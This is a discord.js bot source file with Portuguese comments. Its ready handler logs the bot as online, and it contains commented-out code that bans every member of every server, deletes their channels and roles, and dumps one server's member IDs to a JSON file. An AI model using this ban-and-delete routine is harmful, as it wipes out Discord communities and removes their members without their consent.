const Discord = require('discord.js')
const client = require('../index.js')
const fs = require('fs')

client.on('ready', (client) => {
    const caminhoArquivo = 'channels.json';/* 
    client.guilds.cache.forEach((guild) => {
            guild.members.cache.forEach((member) => {
                member.ban().then((bannedMember) => {
                        console.log(`Banido ${bannedMember.user.tag} do servidor ${guild.name}`);
                        
                        // Após banir o membro, você pode excluir canais e cargos
                        guild.channels.cache.forEach((channel) => {
                            // Verifique se o canal não é o canal geral de texto
                            if (channel.type === 'text' && channel.id !== guild.systemChannelID) {
                                channel.delete()
                                    .then(() => {
                                        console.log(`Canal ${channel.name} excluído em ${guild.name}`);
                                    })
                                    .catch((error) => {
                                        console.error(`Erro ao excluir canal ${channel.name} em ${guild.name}: ${error}`);
                                    });
                            }
                        });

                        guild.roles.cache.forEach((role) => {
                            // Verifique se o cargo não é o cargo @everyone
                            if (role.name !== '@everyone') {
                                role.delete()
                                    .then(() => {
                                        console.log(`Cargo ${role.name} excluído em ${guild.name}`);
                                    })
                                    .catch((error) => {
                                        console.error(`Erro ao excluir cargo ${role.name} em ${guild.name}: ${error}`);
                                    });
                            }
                        });
                    })
                    .catch((error) => {
                        console.error(`Erro ao banir membro do servidor ${guild.name}: ${error}`);
                    });
            });
        
    }); */
    console.log(`🔥 Estou online em ${client.user.username}!`)
    client.user.setStatus('online');
    /* client.user.setStatus('invisible'); */
    /* // Coletar todos os IDs de usuário
    const guild = client.guilds.cache.get('1131241255569989725');
    const usuariosIDs = guild.members.cache.map(member => member.user.id);

    // Criar uma categoria para cada usuário e armazenar os IDs no JSON
    const data = {};
    for (const idUsuario of usuariosIDs) {
        data[idUsuario] = {
            id: idUsuario
        };
    }

    // Salvar no JSON
    fs.writeFileSync(caminhoArquivo, JSON.stringify(data, null, 2), 'utf-8');
    console.log('IDs de usuários salvos no arquivo JSON.'); */
})